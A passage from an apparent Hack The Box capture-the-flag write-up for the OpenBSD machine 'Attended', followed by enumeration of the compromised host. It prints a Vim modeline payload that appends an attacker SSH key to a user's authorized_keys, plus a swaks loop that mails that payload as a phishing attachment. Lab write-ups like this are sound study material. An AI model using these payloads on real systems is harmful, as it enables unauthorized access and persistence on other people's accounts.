+</pre><td class="rouge-code"><pre>:!echo <span class="nt">-en</span> <span class="s1">'\nProxyCommand echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH1G9UlrgsDWJKVyU1c/IkrKAUlrAec7hsVoM7x8mWU+ &gt;&gt; /home/freshness/.ssh/authorized_keys\n'</span> <span class="o">&gt;&gt;</span> /home/shared/.config <span class="o">||</span><span class="s2">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="nb">source</span><span class="se">\!\ \%</span><span class="s2">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><p>My final script that inserted my public key into <code class="language-plaintext highlighter-rouge">/home/freshness/.ssh/authorized_keys</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/attended]
+└─<span class="nv">$ </span><span class="k">for </span>address <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>user<span class="si">)</span><span class="p">;</span> <span class="k">do </span>swaks <span class="nt">--helo</span> attended.htb <span class="se">\</span>
+<span class="nt">--to</span> <span class="nv">$address</span> <span class="nt">--from</span> freshness@attended.htb <span class="nt">--header</span> <span class="s2">"Subject: Check this out"</span> <span class="se">\</span>
+<span class="nt">--body</span> <span class="s2">"Check this out</span><span class="se">\n</span><span class="s2">http://10.10.14.172:8090/"</span> <span class="nt">--attach</span> test3.py <span class="nt">--server</span> 10.10.10.221<span class="p">;</span> <span class="k">done</span>
+<span class="k">***</span> DEPRECATION WARNING: Inferring a filename from the argument to <span class="nt">--attach</span> will be removed <span class="k">in </span>the future.  Prefix filenames with <span class="s1">'@'</span> instead.
+<span class="o">===</span> Trying 10.10.10.221:25...
+<span class="o">===</span> Connected to 10.10.10.221.
+&lt;-  220 proudly setup by guly <span class="k">for </span>attended.htb ESMTP OpenSMTPD
+ -&gt; EHLO attended.htb
+&lt;-  250-proudly setup by guly <span class="k">for </span>attended.htb Hello attended.htb <span class="o">[</span>10.10.14.156], pleased to meet you
+&lt;-  250-8BITMIME
+&lt;-  250-ENHANCEDSTATUSCODES
+&lt;-  250-SIZE 36700160
+&lt;-  250-DSN
+&lt;-  250 HELP
+ -&gt; MAIL FROM:&lt;freshness@attended.htb&gt;
+&lt;-  250 2.0.0: Ok
+ -&gt; RCPT TO:&lt;guly@attended.htb&gt;
+&lt;-  250 2.1.5 Destination address valid: Recipient ok
+ -&gt; DATA
+&lt;-  354 Enter mail, end with <span class="s2">"."</span> on a line by itself
+ -&gt; Date: Thu, 06 May 2021 23:01:48 <span class="nt">-0400</span>
+ -&gt; To: guly@attended.htb
+ -&gt; From: freshness@attended.htb
+ -&gt; Subject: Check this out
+ -&gt; Message-Id: &lt;20210506230148.1584577@kali&gt;
+ -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+ -&gt; MIME-Version: 1.0
+ -&gt; Content-Type: multipart/mixed<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="s2">"----=_MIME_BOUNDARY_000_1584577"</span>
+ -&gt; 
+ -&gt; <span class="nt">------</span><span class="o">=</span>_MIME_BOUNDARY_000_1584577
+ -&gt; Content-Type: text/plain
+ -&gt; 
+ -&gt; Check this out
+ -&gt; http://10.10.14.172:8090/
+ -&gt; <span class="nt">------</span><span class="o">=</span>_MIME_BOUNDARY_000_1584577
+ -&gt; Content-Type: application/octet-stream<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"test3.py"</span>
+ -&gt; Content-Description: test3.py
+ -&gt; Content-Disposition: attachment<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"test3.py"</span>
+ -&gt; Content-Transfer-Encoding: BASE64
+ -&gt; 
+ -&gt; OiFlY2hvIC1lbiAnXG5Qcm94eUNvbW1hbmQgZWNobyBzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFB
+ -&gt; QUFEQVFBQkFBQUJnUUNVNGQyZVhVWDBQbDFlZVA2MVlsUnhqeklKMVZPKy9jaUNYbGNzakh5VWJu
+ -&gt; WlB4MGp3MG1wdTlSRHpKKzF6OGMzTFdsOWdSVTRxNDVzUzg4QXdlQi9zNnl2OTFsblp0ay9Qa0Vy
+ -&gt; bDZld2Q1V2I4NGJiTGN0dXV1NTRkQzB2REo1b09LcHJZRDRRMXJ4dXlKYmJQOVlSRGVteURxRytK
+ -&gt; UVgwK3dKaTVoU0ZoWmZYOXhGZTVaRDU5UjJwaGxZVTc4OGUyYWNmSjZSV2dnTmFIY25aTGtFUnZ4
+ -&gt; RjU5K2FqSDFVTWd5YjZTTUtPNFhMYnJKZ1p4RU9iUzluNktMK1dLVlB4QmprVVhQblQwL09Ecyth
+ -&gt; Ri9oR2lrVUdqM1pWQXIwSTE2eFFmUFU3TldZZjZPSS9PcUFxM0FsUGdKQi9MVUdzWUd5WGVVV0Jr
+ -&gt; REliM3FZUkF0cVRZN09yQjJHYmszQ1lMMk5NT1R0djY5UFB2VnlmcjV5RHhNNXNnSHY5dm52MzFu
+ -&gt; aFJHaDJ6L1dqcGM0aU8vdk9yeTBFRXlDY1crb040dkU0WE1zVmtMVkRzZUYyS0VaWHV3Tjd3YWNz
+ -&gt; YTNqdXo0TVo4VkMyWnlSVUgxNEVWM25lYWluMmZSOXllUE4wRzV2OHZibmd4OU96WGpQK3NuVG9j
+ -&gt; eVlXRlhVcytGOWxWRT0gPj4gL2hvbWUvZnJlc2huZXNzLy5zc2gvYXV0aG9yaXplZF9rZXlzXG4n
+ -&gt; ID4+IC9ob21lL3NoYXJlZC8uY29uZmlnIHx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9m
+ -&gt; YWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK
+ -&gt; 
+ -&gt; <span class="nt">------</span><span class="o">=</span>_MIME_BOUNDARY_000_1584577--
+ -&gt; 
+ -&gt; 
+ -&gt; <span class="nb">.</span>
+&lt;-  250 2.0.0: 89efa82a Message accepted <span class="k">for </span>delivery
+ -&gt; QUIT
+&lt;-  221 2.0.0: Bye
+<span class="o">===</span> Connection closed with remote host.
+</pre></table></code></div></div><p>My final email</p><h3 id="usertxt">User.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>attended$ ls -la
+total 56
+drwxr-x---  4 freshness  freshness  512 May  7 05:00 .
+drwxr-xr-x  5 root       wheel      512 Jun 26  2019 ..
+-rw-r--r--  1 freshness  freshness   87 Jun 26  2019 .Xdefaults
+-rw-r--r--  1 freshness  freshness  771 Jun 26  2019 .cshrc
+-rw-r--r--  1 freshness  freshness  101 Jun 26  2019 .cvsrc
+-rw-r--r--  1 freshness  freshness  359 Jun 26  2019 .login
+-rw-r--r--  1 freshness  freshness  175 Jun 26  2019 .mailrc
+-rw-r--r--  1 freshness  freshness  215 Jun 26  2019 .profile
+drwx------  2 freshness  freshness  512 Aug  6  2019 .ssh
+-rw-------  1 freshness  freshness  754 May  7 04:59 .viminfo
+drwxr-x---  2 freshness  freshness  512 Nov 16 13:57 authkeys
+-rw-r--r--  1 freshness  freshness  436 May  7 04:46 dead.letter
+-rwxr-x---  1 root       freshness  422 Jun 28  2019 fchecker.py
+-r--r-----  1 root       freshness   33 Jun 26  2019 user.txt
+attended$ cat user.txt
+b0390ad535424c0981699b93041a3ff1
+</pre></table></code></div></div><p>After inserting my public key to <code class="language-plaintext highlighter-rouge">/home/freshness/.ssh/authorized_keys</code> I was able to log in using SSH. Waiting in <code class="language-plaintext highlighter-rouge">freshness</code>’s home folder was my user proof!</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-freshness">Enumeration as user <code class="language-plaintext highlighter-rouge">freshness</code></h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>attended$ id
+uid=1001(freshness) gid=1001(freshness) groups=1001(freshness)
+</pre></table></code></div></div><p>There were no interesting groups for <code class="language-plaintext highlighter-rouge">freshness</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>attended$ doas su
+doas: doas is not enabled, /etc/doas.conf: No such file or directory
+</pre></table></code></div></div><p>The command <code class="language-plaintext highlighter-rouge">doas</code> (the BSD equivilent of <code class="language-plaintext highlighter-rouge">sudo</code>) was not enabled on this machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+</pre><td class="rouge-code"><pre>attended$ cat /etc/passwd
+root:*:0:0:Charlie &amp;:/root:/bin/ksh
+daemon:*:1:1:The devil himself:/root:/sbin/nologin
+operator:*:2:5:System &amp;:/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
+build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
+sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
+_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
+_identd:*:29:29:identd:/var/empty:/sbin/nologin
+_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
+_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
+_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
+_x11:*:35:35:X Server:/var/empty:/sbin/nologin
+_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
+_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
+_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
+_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
+_rebound:*:52:52:Rebound DNS Daemon:/var/empty:/sbin/nologin
+_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
+_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
+_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
+_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
+_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
+_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
+_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
+www:*:67:67:HTTP Server:/var/www:/sbin/nologin
+_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
+_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
+_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
+_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
+_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
+_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
+_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
+_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
+_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
+_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
+_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
+_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
+_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
+_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
+_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
+_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
+_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
+_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
+_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
+_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
+_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
+_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
+_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
+_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
+_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
+_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
+_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
+_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
+_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
+_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
+_file:*:104:104:file privsep:/var/empty:/sbin/nologin
+_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
+_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
+_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
+_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
+_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
+_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
+_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
+_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
+nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
+guly:*:1000:1000:guly:/home/guly:/bin/ksh
+freshness:*:1001:1001:freshness:/home/freshness:/bin/ksh
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">guly</code>, <code class="language-plaintext highlighter-rouge">freshness</code>, and <code class="language-plaintext highlighter-rouge">root</code> were the only users that could log into this machine. Their shell was <code class="language-plaintext highlighter-rouge">ksh</code> which might have explained why my complicated python requests/piping shell script into <code class="language-plaintext highlighter-rouge">sh</code> didnt work…</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>attended$ which sh
+/bin/sh
+</pre></table></code></div></div><p>Though, then again <code class="language-plaintext highlighter-rouge">sh</code> was installed…not sure. It worked on my local machine…</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>attended$ cat dead.letter                                                                             
+Date: Fri, 7 May 2021 04:46:30 +0200 (CEST)
+From: root (Cron Daemon)
+To: freshness
+Subject: Cron &lt;freshness@attended&gt; /home/freshness/fchecker.py
+Auto-Submitted: auto-generated
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/home/freshness&gt;
+X-Cron-Env: &lt;LOGNAME=freshness&gt;
+X-Cron-Env: &lt;USER=freshness&gt;
+
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+kex_exchange_identification: Connection closed by remote host
+</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">dead.letter</code> had what looked to be error information from <code class="language-plaintext highlighter-rouge">freshness</code> regarding his config.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>attended$ cat fchecker.py                                                                             
+#!/usr/local/bin/python2.7
+import os,sys
+import subprocess
+import time
+
+path = '/home/shared/'
+command = '/usr/bin/ssh -l freshness -F %s 127.0.0.1'
+for r, d, fs in os.walk(path):
+        for f in fs:
+                cfile = os.path.join(r, f)
+                c = command % cfile
+                #print "running %s" % c
+                p = subprocess.Popen(c,shell=True)
+                time.sleep(0.2)
+                os.unlink(cfile)
+</pre></table></code></div></div><p>There was also a python2.7 script <code class="language-plaintext highlighter-rouge">fchecker.py</code> which looked like it was automating the user <code class="language-plaintext highlighter-rouge">freshness</code>’s login attempts, and would use the config file specified in <code class="language-plaintext highlighter-rouge">/home/shared</code> using the <code class="language-plaintext highlighter-rouge">-F</code> parameter.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre><td class="rouge-code"><pre>attended$ cat .viminfo 
+# This viminfo file was generated by Vim 8.1.
+# You may edit it if you're careful!
+
+# Viminfo version
+|1,4
+
+# Value of 'encoding' when this file was written
+*encoding=latin1
+
+
+# hlsearch on (H) or off (h):
+~h
+# Command Line History (newest to oldest):
+:q
+|2,0,1620356392,,"q"
+
+# Search String History (newest to oldest):
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Debug Line History (newest to oldest):
+
+# Registers:
+
+# File marks:
+'0  1  0  /home/shared/.config
+|4,48,1,0,1620356392,"/home/shared/.config"
+
+# Jumplist (newest first):
+-'  1  0  /home/shared/.config
+|4,39,1,0,1620356392,"/home/shared/.config"
+
+# History of marks within files (newest to oldest):
+
+&gt; /home/shared/.config
+        *       1620356390      0
+        "       1       0
+</pre></table></code></div></div><p>The .viminfo file only contained history information for the config file I had used to gain access.</p><h3 id="attendedgw">attendedgw</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>attended$ ls -la .ssh
+total 16
+drwx------  2 freshness  freshness   512 Aug  6  2019 .
+drwxr-x---  4 freshness  freshness   512 May  7 05:00 ..
+-rw-------  1 freshness  freshness  1760 May  7 04:46 authorized_keys
+-rw-r--r--  1 freshness  freshness   360 Nov 16 13:50 known_hosts
+attended$ cat .ssh/known_hosts                                                                        
+[192.168.23.1]:2222 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHf+XKQUspSh+OB5tQGfllnRm6GbrItHiYWixZj4vCVxxt8DsjRsH8LPbcdxomwm/FpH9HekC+QAO+7FZAj+DsQ=
+[attendedgw]:2222 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHf+XKQUspSh+OB5tQGfllnRm6GbrItHiYWixZj4vCVxxt8DsjRsH8LPbcdxomwm/FpH9HekC+QAO+7FZAj+DsQ=
+attended$ hostname
+attended.htb
+</pre></table></code></div></div><p>I found evidence of another machine <code class="language-plaintext highlighter-rouge">192.168.23.1</code> and the hostname <code class="language-plaintext highlighter-rouge">attendedgw</code> that I had seen <code class="language-plaintext highlighter-rouge">guly</code> mailing me from as well in the <code class="language-plaintext highlighter-rouge">known_hosts</code> file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>attended$ ifconfig
+lo0: flags=8049&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt; mtu 32768
+        index 3 priority 0 llprio 3
+        groups: lo
+        inet6 ::1 prefixlen 128
+        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x3
+        inet 127.0.0.1 netmask 0xff000000
+vio0: flags=8b43&lt;UP,BROADCAST,RUNNING,PROMISC,ALLMULTI,SIMPLEX,MULTICAST&gt; mtu 1500
+        lladdr 00:10:20:30:40:50
+        index 1 priority 0 llprio 3
+        groups: egress
+        media: Ethernet autoselect
+        status: active
+        inet 192.168.23.2 netmask 0xffffff00 broadcast 192.168.23.255
+enc0: flags=0&lt;&gt;
+        index 2 priority 0 llprio 3
+        groups: enc
+        status: active
+pflog0: flags=141&lt;UP,RUNNING,PROMISC&gt; mtu 33136
+        index 4 priority 0 llprio 3
+        groups: pflog
+</pre></table></code></div></div><p>interface <code class="language-plaintext highlighter-rouge">vio0</code> was in PROMISC mode which was interesting</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>attended$ which tcpdump
+/usr/sbin/tcpdump
+attended$ tcpdump -i vio0
+tcpdump: Failed to open bpf device for vio0: Permission denied
+</pre></table></code></div></div><p>unfortunately I was not allowed to run <code class="language-plaintext highlighter-rouge">tcpdump</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>attended$ route -n
+usage: route [-dnqtv] [-T rtable] command [[modifiers] args]
+commands: add, change, delete, exec, flush, get, monitor, show
+attended$ route show
+Routing tables
+
+Internet:
+Destination        Gateway            Flags   Refs      Use   Mtu  Prio Iface
+default            attendedgw.attende UGS        1     2183     -     8 vio0 
+224/4              localhost          URS        0        0 32768     8 lo0  
+127/8              localhost          UGRS       0        0 32768     8 lo0  
+localhost          localhost          UHhl       1      522 32768     1 lo0  
+192.168.23/24      attended.attended. UCn        1        0     -     4 vio0 
+attendedgw.attende fe:e1:ba:d0:8d:9f  UHLch      2      220     -     3 vio0 
+attended.attended. 00:10:20:30:40:50  UHLl       0     2352     -     1 vio0 
+192.168.23.255     attended.attended. UHb        0        0     -     1 vio0 
+
+Internet6:
+Destination        Gateway            Flags   Refs      Use   Mtu  Prio Iface
+::/96              localhost          UGRS       0        0 32768     8 lo0  
+localhost          localhost          UHhl      10       20 32768     1 lo0  
+
+::ffff:0.0.0.0/96  localhost          UGRS       0        0 32768     8 lo0  
+2002::/24          localhost          UGRS       0        0 32768     8 lo0  
+2002:7f00::/24     localhost          UGRS       0        0 32768     8 lo0  
+2002:e000::/20     localhost          UGRS       0        0 32768     8 lo0  
+2002:ff00::/24     localhost          UGRS       0        0 32768     8 lo0  
+fe80::/10          localhost          UGRS       0        0 32768     8 lo0  
+fec0::/10          localhost          UGRS       0        0 32768     8 lo0  
+fe80::1%lo0        fe80::1%lo0        UHl        0        0 32768     1 lo0  
+ff01::/16          localhost          UGRS       0        0 32768     8 lo0  
+ff01::%lo0/32      fe80::1%lo0        Um         0        1 32768     4 lo0  
+ff02::/16          localhost          UGRS       0        0 32768     8 lo0  
+ff02::%lo0/32      fe80::1%lo0        Um         0        1 32768     4 lo0
+</pre></table></code></div></div><p>I checked the routing tables and saw that there were a few other hosts</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>attended$ ping attendedgw
+PING attendedgw.attended.htb (192.168.23.1): 56 data bytes
+64 bytes from 192.168.23.1: icmp_seq=0 ttl=255 time=0.618 ms
+64 bytes from 192.168.23.1: icmp_seq=1 ttl=255 time=0.346 ms
+64 bytes from 192.168.23.1: icmp_seq=2 ttl=255 time=0.290 ms
+64 bytes from 192.168.23.1: icmp_seq=3 ttl=255 time=0.377 ms
+^C
+--- attendedgw.attended.htb ping statistics ---
+4 packets transmitted, 4 packets received, 0.0% packet loss
+round-trip min/avg/max/std-dev = 0.290/0.408/0.618/0.125 ms
+</pre></table></code></div></div><p>I could ping <code class="language-plaintext highlighter-rouge">attendedgw</code> which had the ip <code class="language-plaintext highlighter-rouge">192.168.23.1</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>attended$ ssh freshness@attendedgw
+ssh: connect to host attendedgw port 22: Connection refused
+attended$ ssh freshness@attendedgw -p 2222
+freshness@attendedgw's password: 
+Permission denied, please try again.
+freshness@attendedgw's password: 
+Permission denied, please try again.
+freshness@attendedgw's password: 
+freshness@attendedgw: Permission denied (publickey,password,keyboard-interactive).
+</pre></table></code></div></div><p>I tried to SSH into <code class="language-plaintext highlighter-rouge">attendedgw</code> but I needed a password for <code class="language-plaintext highlighter-rouge">freshness</code>. SSH for the other machine was also on port 2222</p><h3 id="authkeys">authkeys</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>attended$ cd authkeys/                                                                                
+attended$ ls -la
+total 24
+drwxr-x---  2 freshness  freshness   512 Nov 16 13:57 .
+drwxr-x---  4 freshness  freshness   512 May  7 05:00 ..
+-rw-r--r--  1 root       wheel      5424 Nov 16 13:35 authkeys
+-rw-r-----  1 root       freshness   178 Nov  6  2019 note.txt
+attended$ cat note.txt                                                                                
+on attended:
+[ ] enable authkeys command for sshd
+[x] remove source code
+[ ] use nobody
+on attendedgw:
+[x] enable authkeys command for sshd
+[x] remove source code
+[ ] use nobody
+</pre></table></code></div></div><p>So the source code of this authkeys file had been removed, but not implemented on this machine. On the machine <code class="language-plaintext highlighter-rouge">attendedgw</code> however, it had been implemented for sshd. I was curious as to what this file was or did</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>attended$ file authkeys           
+authkeys: ELF 64-bit LSB executable, x86-64, version 1
+</pre></table></code></div></div><p>It was a 64-bit ELF executable file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>attended$ ./authkeys                                                                                  
+ksh: ./authkeys: cannot execute - Permission denied
+</pre></table></code></div></div><p>I was not allowed to run the file</p><h3 id="getting-a-shell">Getting a shell</h3><p>Under Construction! This machine took so long that I didn’t finish before the deadline. Sorry! I will have to finish this one at a later time.</p><h3 id="roottxt">Root.txt</h3><p>Thanks to <a href="https://www.hackthebox.eu/home/users/profile/&lt;profile_num&gt;"><code class="language-plaintext highlighter-rouge">&lt;box_creator&gt;</code></a> for something interesting or useful about this machine.</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/openbsd/" class="post-tag no-text-decoration" >openbsd</a> <a href="/tags/bsd/" class="post-tag no-text-decoration" >bsd</a> <a href="/tags/insane/" class="post-tag no-text-decoration" >insane</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/smtp/" class="post-tag no-text-decoration" >smtp</a> <a href="/tags/phishing/" class="post-tag 